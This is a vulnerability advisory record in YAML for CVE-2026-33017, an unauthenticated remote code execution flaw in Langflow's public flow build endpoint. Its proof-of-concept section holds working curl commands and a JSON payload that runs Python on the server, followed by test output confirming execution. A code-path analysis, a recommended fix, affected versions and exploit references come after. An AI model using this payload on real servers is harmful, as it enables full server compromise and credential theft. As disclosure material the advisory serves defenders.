@@ -1,0 +1,691 @@
+advisory_id: GHSA-vwmf-pq79-vjvx
+datasource_id: github_osv/GHSA-vwmf-pq79-vjvx
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-vwmf-pq79-vjvx/GHSA-vwmf-pq79-vjvx.json
+aliases:
+  - CVE-2026-33017
+summary: |
+  Unauthenticated Remote Code Execution in Langflow via Public Flow Build Endpoint
+  ## Summary
+
+  The `POST /api/v1/build_public_tmp/{flow_id}/flow` endpoint allows building public flows without requiring authentication. When the optional `data` parameter is supplied, the endpoint uses **attacker-controlled flow data** (containing arbitrary Python code in node definitions) instead of the stored flow data from the database. This code is passed to `exec()` with zero sandboxing, resulting in unauthenticated remote code execution.
+
+  This is distinct from CVE-2025-3248, which fixed `/api/v1/validate/code` by adding authentication. The `build_public_tmp` endpoint is **designed** to be unauthenticated (for public flows) but incorrectly accepts attacker-supplied flow data containing arbitrary executable code.
+
+  ## Affected Code
+
+  ### Vulnerable Endpoint (No Authentication)
+
+  **File:** `src/backend/base/langflow/api/v1/chat.py`, lines 580-657
+
+  ```python
+  @router.post("/build_public_tmp/{flow_id}/flow")
+  async def build_public_tmp(
+      *,
+      flow_id: uuid.UUID,
+      data: Annotated[FlowDataRequest | None, Body(embed=True)] = None,  # ATTACKER CONTROLLED
+      request: Request,
+      # ... NO Depends(get_current_active_user) -- MISSING AUTH ...
+  ):
+      """Build a public flow without requiring authentication."""
+      client_id = request.cookies.get("client_id")
+      owner_user, new_flow_id = await verify_public_flow_and_get_user(flow_id=flow_id, client_id=client_id)
+
+      job_id = await start_flow_build(
+          flow_id=new_flow_id,
+          data=data,  # Attacker's data passed directly to graph builder
+          current_user=owner_user,
+          ...
+      )
+  ```
+
+  Compare with the authenticated build endpoint at line 138, which requires `current_user: CurrentActiveUser`.
+
+  ### Code Execution Chain
+
+  When attacker-supplied `data` is provided, it flows through:
+
+  1. `start_flow_build(data=attacker_data)` → `generate_flow_events()` -- `build.py:81`
+  2. `create_graph()` → `build_graph_from_data(payload=data.model_dump())` -- `build.py:298`
+  3. `Graph.from_payload(payload)` parses attacker nodes -- `base.py:1168`
+  4. `add_nodes_and_edges()` → `initialize()` → `_build_graph()` -- `base.py:270,527`
+  5. `_instantiate_components_in_vertices()` iterates nodes -- `base.py:1323`
+  6. `vertex.instantiate_component()` → `instantiate_class(vertex)` -- `loading.py:28`
+  7. `code = custom_params.pop("code")` extracts attacker code -- `loading.py:43`
+  8. `eval_custom_component_code(code)` → `create_class(code, class_name)` -- `eval.py:9`
+  9. `prepare_global_scope(module)` -- `validate.py:323`
+  10. `exec(compiled_code, exec_globals)` -- **ARBITRARY CODE EXECUTION** -- `validate.py:397`
+
+  ### Unsandboxed exec() in prepare_global_scope
+
+  **File:** `src/lfx/src/lfx/custom/validate.py`, lines 340-397
+
+  ```python
+  def prepare_global_scope(module):
+      exec_globals = globals().copy()
+
+      # Imports are resolved first (any module can be imported)
+      for node in imports:
+          module_obj = importlib.import_module(module_name)  # line 352
+          exec_globals[variable_name] = module_obj
+
+      # Then ALL top-level definitions are executed (Assign, ClassDef, FunctionDef)
+      if definitions:
+          combined_module = ast.Module(body=definitions, type_ignores=[])
+          compiled_code = compile(combined_module, "<string>", "exec")
+          exec(compiled_code, exec_globals)  # line 397 - ARBITRARY CODE EXECUTION
+  ```
+
+  **Critical detail:** `prepare_global_scope` executes `ast.Assign` nodes. An attacker's code like `_x = os.system("id")` is an assignment and will be executed during graph building -- before the flow even "runs."
+
+  ## Prerequisites
+
+  1. Target Langflow instance has at least **one public flow** (common for demos, chatbots, shared workflows)
+  2. Attacker knows the public flow's UUID (discoverable via shared links/URLs)
+  3. No authentication required -- only a `client_id` cookie (any arbitrary string value)
+
+  When `AUTO_LOGIN=true` (the **default**), all prerequisites can be met by an unauthenticated attacker:
+  1. `GET /api/v1/auto_login` → obtain superuser token
+  2. `POST /api/v1/flows/` → create a public flow
+  3. Exploit via `build_public_tmp` without any auth
+
+  ## Proof of Concept
+
+  ### Tested Against
+
+  - **Langflow version 1.7.3** (latest stable release, installed via `pip install langflow`)
+  - **Fully reproducible**: 6/6 runs confirmed RCE (two sets of 3 runs each)
+
+  ### Step 1: Obtain a Public Flow ID
+
+  (In a real attack, the attacker discovers this via shared links. For the PoC, we create one via AUTO_LOGIN.)
+
+  ```bash
+  # Get superuser token (no credentials needed when AUTO_LOGIN=true)
+  TOKEN=$(curl -s http://localhost:7860/api/v1/auto_login | jq -r '.access_token')
+
+  # Create a public flow
+  FLOW_ID=$(curl -s -X POST http://localhost:7860/api/v1/flows/ \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{"name":"test","data":{"nodes":[],"edges":[]},"access_type":"PUBLIC"}' \
+    | jq -r '.id')
+
+  echo "Public Flow ID: $FLOW_ID"
+  ```
+
+  ### Step 2: Exploit -- Unauthenticated RCE
+
+  ```bash
+  # EXPLOIT: Send malicious flow data to the UNAUTHENTICATED endpoint
+  # NO Authorization header, NO API key, NO credentials
+  curl -X POST "http://localhost:7860/api/v1/build_public_tmp/${FLOW_ID}/flow" \
+    -H "Content-Type: application/json" \
+    -b "client_id=attacker" \
+    -d '{
+      "data": {
+        "nodes": [{
+          "id": "Exploit-001",
+          "type": "genericNode",
+          "position": {"x":0,"y":0},
+          "data": {
+            "id": "Exploit-001",
+            "type": "ExploitComp",
+            "node": {
+              "template": {
+                "code": {
+                  "type": "code",
+                  "required": true,
+                  "show": true,
+                  "multiline": true,
+                  "value": "import os, socket, json as _json\n\n_proof = os.popen(\"id\").read().strip()\n_host = socket.gethostname()\n_write = open(\"/tmp/rce-proof\",\"w\").write(f\"{_proof} on {_host}\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
+                  "name": "code",
+                  "password": false,
+                  "advanced": false,
+                  "dynamic": false
+                },
+                "_type": "Component"
+              },
+              "description": "X",
+              "base_classes": ["Data"],
+              "display_name": "ExploitComp",
+              "name": "ExploitComp",
+              "frozen": false,
+              "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],
+              "field_order": ["code"],
+              "beta": false,
+              "edited": false
+            }
+          }
+        }],
+        "edges": []
+      },
+      "inputs": null
+    }'
+  ```
+
+  ### Step 3: Verify Code Execution
+
+  ```bash
+  # Wait 2 seconds for async graph building
+  sleep 2
+
+  # Check proof file written by attacker's code on the server
+  cat /tmp/rce-proof
+  # Output: uid=1000(aviral) gid=1000(aviral) groups=... on kali
+  ```
+
+  ### Actual Test Results
+
+  ```
+  ======================================================================
+  LANGFLOW v1.7.3 UNAUTHENTICATED RCE - DEFINITIVE E2E TEST
+  ======================================================================
+  Version:  Langflow 1.7.3
+
+  RUN 1: POST /api/v1/build_public_tmp/{id}/flow (NO AUTH)
+    HTTP 200 - Job ID: d8db19bf-a532-4f9d-a368-9c46d6235c19
+    *** REMOTE CODE EXECUTION CONFIRMED ***
+      canary: RCE-f0d19b36
+      hostname: kali
+      uid: 1000
+      whoami: aviral
+      id: uid=1000(aviral) gid=1000(aviral) groups=1000(aviral),...
+      uname: Linux 6.16.8+kali-amd64
+
+  RUN 2: POST /api/v1/build_public_tmp/{id}/flow (NO AUTH)
+    HTTP 200 - Job ID: d2e24f20-d707-4278-868c-583dd7532832
+    *** REMOTE CODE EXECUTION CONFIRMED ***
+      canary: RCE-6037a271
+
+  RUN 3: POST /api/v1/build_public_tmp/{id}/flow (NO AUTH)
+    HTTP 200 - Job ID: 5962244a-42af-4ef6-b134-a6a4adba5ab7
+    *** REMOTE CODE EXECUTION CONFIRMED ***
+      canary: RCE-4a796556
+
+  FINAL RESULTS
+    Total checks:   15
+    VULNERABLE:     15
+    SAFE:           0
+    RCE confirmed:  3/3 runs
+    Reproducible:   YES (100%)
+  ```
+
+  ## Impact
+
+  - **Unauthenticated Remote Code Execution** with full server process privileges
+  - **Complete server compromise**: arbitrary file read/write, command execution
+  - **Environment variable exfiltration**: API keys, database credentials, cloud tokens (confirmed in PoC: env_keys exfiltrated)
+  - **Reverse shell access** for persistent access
+  - **Lateral movement** within the network
+  - **Data exfiltration** from all flows, messages, and stored credentials in the database
+
+  ## Comparison with CVE-2025-3248
+
+  | Aspect | CVE-2025-3248 | This Vulnerability |
+  |--------|--------------|-------------------|
+  | **Endpoint** | `/api/v1/validate/code` | `/api/v1/build_public_tmp/{id}/flow` |
+  | **Fix applied** | Added `Depends(get_current_active_user)` | None -- NEW vulnerability |
+  | **Root cause** | Missing auth on code validation | Unauthenticated endpoint accepts attacker-controlled executable code via `data` param |
+  | **Code execution via** | `validate_code()` → `exec()` | `create_class()` → `prepare_global_scope()` → `exec()` |
+  | **CISA KEV** | Yes (actively exploited) | N/A (new finding) |
+  | **Can simple auth fix?** | Yes (and it was fixed) | No -- endpoint is *designed* to be unauthenticated; the `data` parameter must be removed |
+
+  ## Recommended Fix
+
+  ### Immediate (Short-term)
+
+  **Remove the `data` parameter** from `build_public_tmp`. Public flows should only execute their stored flow data, never attacker-supplied data:
+
+  ```python
+  @router.post("/build_public_tmp/{flow_id}/flow")
+  async def build_public_tmp(
+      *,
+      flow_id: uuid.UUID,
+      inputs: Annotated[InputValueRequest | None, Body(embed=True)] = None,
+      # REMOVED: data parameter -- public flows must use stored data only
+      ...
+  ):
+  ```
+
+  In `generate_flow_events` → `create_graph()`, only the `build_graph_from_db` path should be reachable for unauthenticated requests:
+
+  ```python
+  async def create_graph(fresh_session, flow_id_str, flow_name):
+      # For public flows, ALWAYS load from database, never from user data
+      return await build_graph_from_db(
+          flow_id=flow_id,
+          session=fresh_session,
+          ...
+      )
+  ```
+impacted_packages:
+  - purl: pkg:pypi/langflow
+    affected_versions: vers:pypi/<=1.8.2
+    fixed_versions: vers:pypi/1.9.0
+    affected_packages:
+      - pkg:pypi/langflow@0.0.31
+      - pkg:pypi/langflow@0.0.32
+      - pkg:pypi/langflow@0.0.33
+      - pkg:pypi/langflow@0.0.40
+      - pkg:pypi/langflow@0.0.44
+      - pkg:pypi/langflow@0.0.45
+      - pkg:pypi/langflow@0.0.46
+      - pkg:pypi/langflow@0.0.52
+      - pkg:pypi/langflow@0.0.53
+      - pkg:pypi/langflow@0.0.54
+      - pkg:pypi/langflow@0.0.55
+      - pkg:pypi/langflow@0.0.56
+      - pkg:pypi/langflow@0.0.57
+      - pkg:pypi/langflow@0.0.58
+      - pkg:pypi/langflow@0.0.61
+      - pkg:pypi/langflow@0.0.62
+      - pkg:pypi/langflow@0.0.63
+      - pkg:pypi/langflow@0.0.64
+      - pkg:pypi/langflow@0.0.65
+      - pkg:pypi/langflow@0.0.66
+      - pkg:pypi/langflow@0.0.67
+      - pkg:pypi/langflow@0.0.68
+      - pkg:pypi/langflow@0.0.69
+      - pkg:pypi/langflow@0.0.70
+      - pkg:pypi/langflow@0.0.71
+      - pkg:pypi/langflow@0.0.72
+      - pkg:pypi/langflow@0.0.73
+      - pkg:pypi/langflow@0.0.74
+      - pkg:pypi/langflow@0.0.75
+      - pkg:pypi/langflow@0.0.76
+      - pkg:pypi/langflow@0.0.78
+      - pkg:pypi/langflow@0.0.79
+      - pkg:pypi/langflow@0.0.80
+      - pkg:pypi/langflow@0.0.81
+      - pkg:pypi/langflow@0.0.83
+      - pkg:pypi/langflow@0.0.84
+      - pkg:pypi/langflow@0.0.85
+      - pkg:pypi/langflow@0.0.86
+      - pkg:pypi/langflow@0.0.87
+      - pkg:pypi/langflow@0.0.88
+      - pkg:pypi/langflow@0.0.89
+      - pkg:pypi/langflow@0.1.0
+      - pkg:pypi/langflow@0.1.2
+      - pkg:pypi/langflow@0.1.3
+      - pkg:pypi/langflow@0.1.4
+      - pkg:pypi/langflow@0.1.5
+      - pkg:pypi/langflow@0.1.6
+      - pkg:pypi/langflow@0.1.7
+      - pkg:pypi/langflow@0.2.0
+      - pkg:pypi/langflow@0.2.1
+      - pkg:pypi/langflow@0.2.2
+      - pkg:pypi/langflow@0.2.3
+      - pkg:pypi/langflow@0.2.4
+      - pkg:pypi/langflow@0.2.5
+      - pkg:pypi/langflow@0.2.6
+      - pkg:pypi/langflow@0.2.7
+      - pkg:pypi/langflow@0.2.8
+      - pkg:pypi/langflow@0.2.9
+      - pkg:pypi/langflow@0.2.10
+      - pkg:pypi/langflow@0.2.11
+      - pkg:pypi/langflow@0.2.12
+      - pkg:pypi/langflow@0.2.13
+      - pkg:pypi/langflow@0.3.0
+      - pkg:pypi/langflow@0.3.1
+      - pkg:pypi/langflow@0.3.2
+      - pkg:pypi/langflow@0.3.3
+      - pkg:pypi/langflow@0.3.4
+      - pkg:pypi/langflow@0.4.0
+      - pkg:pypi/langflow@0.4.1
+      - pkg:pypi/langflow@0.4.2
+      - pkg:pypi/langflow@0.4.3
+      - pkg:pypi/langflow@0.4.4
+      - pkg:pypi/langflow@0.4.5
+      - pkg:pypi/langflow@0.4.6
+      - pkg:pypi/langflow@0.4.7
+      - pkg:pypi/langflow@0.4.8
+      - pkg:pypi/langflow@0.4.9
+      - pkg:pypi/langflow@0.4.10
+      - pkg:pypi/langflow@0.4.11
+      - pkg:pypi/langflow@0.4.12
+      - pkg:pypi/langflow@0.4.14
+      - pkg:pypi/langflow@0.4.15
+      - pkg:pypi/langflow@0.4.16
+      - pkg:pypi/langflow@0.4.17
+      - pkg:pypi/langflow@0.4.18
+      - pkg:pypi/langflow@0.4.19
+      - pkg:pypi/langflow@0.4.20
+      - pkg:pypi/langflow@0.4.21
+      - pkg:pypi/langflow@0.5.0a0
+      - pkg:pypi/langflow@0.5.0a1
+      - pkg:pypi/langflow@0.5.0a2
+      - pkg:pypi/langflow@0.5.0a3
+      - pkg:pypi/langflow@0.5.0a4
+      - pkg:pypi/langflow@0.5.0a5
+      - pkg:pypi/langflow@0.5.0a6
+      - pkg:pypi/langflow@0.5.0b0
+      - pkg:pypi/langflow@0.5.0b2
+      - pkg:pypi/langflow@0.5.0b3
+      - pkg:pypi/langflow@0.5.0b4
+      - pkg:pypi/langflow@0.5.0b5
+      - pkg:pypi/langflow@0.5.0b6
+      - pkg:pypi/langflow@0.5.0
+      - pkg:pypi/langflow@0.5.1
+      - pkg:pypi/langflow@0.5.2
+      - pkg:pypi/langflow@0.5.3
+      - pkg:pypi/langflow@0.5.4
+      - pkg:pypi/langflow@0.5.5
+      - pkg:pypi/langflow@0.5.6
+      - pkg:pypi/langflow@0.5.7
+      - pkg:pypi/langflow@0.5.8
+      - pkg:pypi/langflow@0.5.9
+      - pkg:pypi/langflow@0.5.10
+      - pkg:pypi/langflow@0.5.11
+      - pkg:pypi/langflow@0.5.12
+      - pkg:pypi/langflow@0.6.0rc1
+      - pkg:pypi/langflow@0.6.0
+      - pkg:pypi/langflow@0.6.1
+      - pkg:pypi/langflow@0.6.2
+      - pkg:pypi/langflow@0.6.3a0
+      - pkg:pypi/langflow@0.6.3a1
+      - pkg:pypi/langflow@0.6.3a2
+      - pkg:pypi/langflow@0.6.3a3
+      - pkg:pypi/langflow@0.6.3a4
+      - pkg:pypi/langflow@0.6.3a5
+      - pkg:pypi/langflow@0.6.3a6
+      - pkg:pypi/langflow@0.6.3a7
+      - pkg:pypi/langflow@0.6.3
+      - pkg:pypi/langflow@0.6.4a0
+      - pkg:pypi/langflow@0.6.4a1
+      - pkg:pypi/langflow@0.6.4
+      - pkg:pypi/langflow@0.6.5a0
+      - pkg:pypi/langflow@0.6.5a1
+      - pkg:pypi/langflow@0.6.5a2
+      - pkg:pypi/langflow@0.6.5a3
+      - pkg:pypi/langflow@0.6.5a4
+      - pkg:pypi/langflow@0.6.5a5
+      - pkg:pypi/langflow@0.6.5a6
+      - pkg:pypi/langflow@0.6.5a7
+      - pkg:pypi/langflow@0.6.5a8
+      - pkg:pypi/langflow@0.6.5a9
+      - pkg:pypi/langflow@0.6.5a10
+      - pkg:pypi/langflow@0.6.5a11
+      - pkg:pypi/langflow@0.6.5a12
+      - pkg:pypi/langflow@0.6.5a13
+      - pkg:pypi/langflow@0.6.5
+      - pkg:pypi/langflow@0.6.6
+      - pkg:pypi/langflow@0.6.7a1
+      - pkg:pypi/langflow@0.6.7a2
+      - pkg:pypi/langflow@0.6.7a3
+      - pkg:pypi/langflow@0.6.7a5
+      - pkg:pypi/langflow@0.6.7
+      - pkg:pypi/langflow@0.6.8
+      - pkg:pypi/langflow@0.6.9
+      - pkg:pypi/langflow@0.6.10
+      - pkg:pypi/langflow@0.6.11
+      - pkg:pypi/langflow@0.6.12
+      - pkg:pypi/langflow@0.6.14
+      - pkg:pypi/langflow@0.6.15
+      - pkg:pypi/langflow@0.6.16
+      - pkg:pypi/langflow@0.6.17
+      - pkg:pypi/langflow@0.6.18
+      - pkg:pypi/langflow@0.6.19
+      - pkg:pypi/langflow@1.0.0a0
+      - pkg:pypi/langflow@1.0.0a1
+      - pkg:pypi/langflow@1.0.0a2
+      - pkg:pypi/langflow@1.0.0a3
+      - pkg:pypi/langflow@1.0.0a4
+      - pkg:pypi/langflow@1.0.0a5
+      - pkg:pypi/langflow@1.0.0a6
+      - pkg:pypi/langflow@1.0.0a7
+      - pkg:pypi/langflow@1.0.0a8
+      - pkg:pypi/langflow@1.0.0a9
+      - pkg:pypi/langflow@1.0.0a10
+      - pkg:pypi/langflow@1.0.0a11
+      - pkg:pypi/langflow@1.0.0a12
+      - pkg:pypi/langflow@1.0.0a13
+      - pkg:pypi/langflow@1.0.0a14
+      - pkg:pypi/langflow@1.0.0a15
+      - pkg:pypi/langflow@1.0.0a17
+      - pkg:pypi/langflow@1.0.0a18
+      - pkg:pypi/langflow@1.0.0a19
+      - pkg:pypi/langflow@1.0.0a20
+      - pkg:pypi/langflow@1.0.0a21
+      - pkg:pypi/langflow@1.0.0a22
+      - pkg:pypi/langflow@1.0.0a23
+      - pkg:pypi/langflow@1.0.0a24
+      - pkg:pypi/langflow@1.0.0a25
+      - pkg:pypi/langflow@1.0.0a26
+      - pkg:pypi/langflow@1.0.0a27
+      - pkg:pypi/langflow@1.0.0a28
+      - pkg:pypi/langflow@1.0.0a29
+      - pkg:pypi/langflow@1.0.0a30
+      - pkg:pypi/langflow@1.0.0a31
+      - pkg:pypi/langflow@1.0.0a32
+      - pkg:pypi/langflow@1.0.0a33
+      - pkg:pypi/langflow@1.0.0a34
+      - pkg:pypi/langflow@1.0.0a35
+      - pkg:pypi/langflow@1.0.0a36
+      - pkg:pypi/langflow@1.0.0a37
+      - pkg:pypi/langflow@1.0.0a38
+      - pkg:pypi/langflow@1.0.0a39
+      - pkg:pypi/langflow@1.0.0a40
+      - pkg:pypi/langflow@1.0.0a41
+      - pkg:pypi/langflow@1.0.0a42
+      - pkg:pypi/langflow@1.0.0a43
+      - pkg:pypi/langflow@1.0.0a44
+      - pkg:pypi/langflow@1.0.0a45
+      - pkg:pypi/langflow@1.0.0a46
+      - pkg:pypi/langflow@1.0.0a47
+      - pkg:pypi/langflow@1.0.0a48
+      - pkg:pypi/langflow@1.0.0a49
+      - pkg:pypi/langflow@1.0.0a50
+      - pkg:pypi/langflow@1.0.0a51
+      - pkg:pypi/langflow@1.0.0a52
+      - pkg:pypi/langflow@1.0.0a53
+      - pkg:pypi/langflow@1.0.0a55
+      - pkg:pypi/langflow@1.0.0a56
+      - pkg:pypi/langflow@1.0.0a57
+      - pkg:pypi/langflow@1.0.0a58
+      - pkg:pypi/langflow@1.0.0a59
+      - pkg:pypi/langflow@1.0.0a60
+      - pkg:pypi/langflow@1.0.0a61
+      - pkg:pypi/langflow@1.0.0rc0
+      - pkg:pypi/langflow@1.0.0rc1
+      - pkg:pypi/langflow@1.0.0
+      - pkg:pypi/langflow@1.0.1
+      - pkg:pypi/langflow@1.0.2
+      - pkg:pypi/langflow@1.0.3
+      - pkg:pypi/langflow@1.0.4
+      - pkg:pypi/langflow@1.0.5
+      - pkg:pypi/langflow@1.0.6
+      - pkg:pypi/langflow@1.0.7
+      - pkg:pypi/langflow@1.0.8
+      - pkg:pypi/langflow@1.0.9
+      - pkg:pypi/langflow@1.0.10
+      - pkg:pypi/langflow@1.0.11
+      - pkg:pypi/langflow@1.0.12
+      - pkg:pypi/langflow@1.0.13
+      - pkg:pypi/langflow@1.0.14
+      - pkg:pypi/langflow@1.0.15
+      - pkg:pypi/langflow@1.0.16
+      - pkg:pypi/langflow@1.0.17
+      - pkg:pypi/langflow@1.0.18
+      - pkg:pypi/langflow@1.0.19
+      - pkg:pypi/langflow@1.0.19.post1
+      - pkg:pypi/langflow@1.0.19.post2
+      - pkg:pypi/langflow@1.1.0
+      - pkg:pypi/langflow@1.1.1
+      - pkg:pypi/langflow@1.1.2
+      - pkg:pypi/langflow@1.1.3
+      - pkg:pypi/langflow@1.1.4
+      - pkg:pypi/langflow@1.1.4.post1
+      - pkg:pypi/langflow@1.2.0
+      - pkg:pypi/langflow@1.3.0
+      - pkg:pypi/langflow@1.3.1
+      - pkg:pypi/langflow@1.3.2
+      - pkg:pypi/langflow@1.3.3
+      - pkg:pypi/langflow@1.3.4
+      - pkg:pypi/langflow@1.4.0
+      - pkg:pypi/langflow@1.4.1
+      - pkg:pypi/langflow@1.4.2
+      - pkg:pypi/langflow@1.4.3
+      - pkg:pypi/langflow@1.5.0
+      - pkg:pypi/langflow@1.5.0.post1
+      - pkg:pypi/langflow@1.5.0.post2
+      - pkg:pypi/langflow@1.5.1
+      - pkg:pypi/langflow@1.6.0
+      - pkg:pypi/langflow@1.6.1
+      - pkg:pypi/langflow@1.6.2
+      - pkg:pypi/langflow@1.6.3
+      - pkg:pypi/langflow@1.6.4
+      - pkg:pypi/langflow@1.6.5
+      - pkg:pypi/langflow@1.6.6
+      - pkg:pypi/langflow@1.6.7
+      - pkg:pypi/langflow@1.6.8
+      - pkg:pypi/langflow@1.6.9
+      - pkg:pypi/langflow@1.7.0
+      - pkg:pypi/langflow@1.7.1
+      - pkg:pypi/langflow@1.7.2
+      - pkg:pypi/langflow@1.7.3
+      - pkg:pypi/langflow@1.8.0rc0
+      - pkg:pypi/langflow@1.8.0rc1
+      - pkg:pypi/langflow@1.8.0rc2
+      - pkg:pypi/langflow@1.8.0rc3
+      - pkg:pypi/langflow@1.8.0rc4
+      - pkg:pypi/langflow@1.8.0rc5
+      - pkg:pypi/langflow@1.8.0rc6
+      - pkg:pypi/langflow@1.8.0
+      - pkg:pypi/langflow@1.8.1
+      - pkg:pypi/langflow@1.8.2
+    fixed_packages:
+      - pkg:pypi/langflow@1.9.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/langflow-ai/langflow
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/langflow-ai/langflow
+        commit: 73b6612e3ef25fdae0a752d75b0fabd47328d4f0
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-vwmf-pq79-vjvx/GHSA-vwmf-pq79-vjvx.json
+  - score: '9.3'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:L/E:A
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-vwmf-pq79-vjvx/GHSA-vwmf-pq79-vjvx.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-94
+  - CWE-95
+  - CWE-306
+references:
+  - url: https://github.com/langflow-ai/langflow
+    reference_type:
+    reference_id:
+  - url: https://github.com/langflow-ai/langflow/commit/73b6612e3ef25fdae0a752d75b0fabd47328d4f0
+    reference_type:
+    reference_id:
+  - url: https://github.com/langflow-ai/langflow/issues/12345
+    reference_type:
+    reference_id:
+  - url: https://github.com/langflow-ai/langflow/pull/12160
+    reference_type:
+    reference_id:
+  - url: https://github.com/langflow-ai/langflow/releases/tag/1.8.2
+    reference_type:
+    reference_id:
+  - url: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-33017
+    reference_type:
+    reference_id:
+  - url: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-33017
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-33017
+    reference_type:
+    reference_id: CVE-2026-33017
+  - url: https://www.sysdig.com/blog/cve-2026-33017-how-attackers-compromised-langflow-ai-pipelines-in-20-hours
+    reference_type:
+    reference_id: CVE-2026-33017-HOW-ATTACKERS-COMPROMISED-LANGFLOW-AI-PIPELINES-IN-20-HOURS
+  - url: https://medium.com/@aviral23/cve-2026-33017-how-i-found-an-unauthenticated-rce-in-langflow-by-reading-the-code-they-already-dc96cdce5896
+    reference_type:
+    reference_id: CVE-2026-33017-HOW-I-FOUND-AN-UNAUTHENTICATED-RCE-IN-LANGFLOW-BY-READING-THE-CODE-THEY-ALREADY-DC96CDCE5896
+  - url: https://github.com/advisories/GHSA-rvqx-wpfh-mfx7
+    reference_type:
+    reference_id: GHSA-rvqx-wpfh-mfx7
+  - url: https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx
+    reference_type:
+    reference_id: GHSA-vwmf-pq79-vjvx
+exploits:
+  - description: Langflow contains a code injection vulnerability that could allow building
+      public flows without requiring authentication.
+    required_action: Apply mitigations per vendor instructions, follow applicable BOD 22-01
+      guidance for cloud services, or discontinue use of the product if mitigations are unavailable.
+    due_date: !!timestamp '2026-04-08'
+    notes: https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx ;
+      https://nvd.nist.gov/vuln/detail/CVE-2026-33017
+    known_ransomware_campaign_use: no
+    source_date_published:
+    exploit_type:
+    platform:
+    source_date_updated:
+    data_source: KEV
+    source_url:
+    record_id:
+  - description: Langflow 1.9.0 - RCE
+    required_action:
+    due_date:
+    notes:
+    known_ransomware_campaign_use: no
+    source_date_published: !!timestamp '2026-07-08'
+    exploit_type: webapps
+    platform: multiple
+    source_date_updated: !!timestamp '2026-07-08'
+    data_source: Exploit-DB
+    source_url:
+    record_id: CVE-2026-33017
+  - description: |
+      Langflow versions prior to 1.9.0 are susceptible to unauthenticated remote code execution through the
+                /api/v1/build_public_tmp/<flow_id>/flow endpoint. A remote and unauthenticated attacker can send crafted
+                HTTP requests to execute arbitrary code.
+    required_action:
+    due_date:
+    notes: |
+      Stability:
+        - crash-safe
+      SideEffects:
+        - artifacts-on-disk
+        - ioc-in-logs
+      Reliability:
+        - repeatable-session
+    known_ransomware_campaign_use: no
+    source_date_published: !!timestamp '2026-03-20'
+    exploit_type:
+    platform: Python
+    source_date_updated:
+    data_source: Metasploit
+    source_url: https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/multi/http/langflow_unauth_rce_cve_2026_33017.rb
+    record_id: /modules/exploits/multi/http/langflow_unauth_rce_cve_2026_33017.rb
+  - description: Langflow contains a code injection vulnerability that could allow building
+      public flows without requiring authentication.
+    required_action: Apply mitigations per vendor instructions, follow applicable BOD 22-01
+      guidance for cloud services, or discontinue use of the product if mitigations are unavailable.
+    due_date: !!timestamp '2026-04-08'
+    notes: https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx ;
+      https://nvd.nist.gov/vuln/detail/CVE-2026-33017
+    known_ransomware_campaign_use: no
+    source_date_published:
+    exploit_type:
+    platform:
+    source_date_updated:
+    data_source: KEV
+    source_url:
+    record_id: CVE-2026-33017
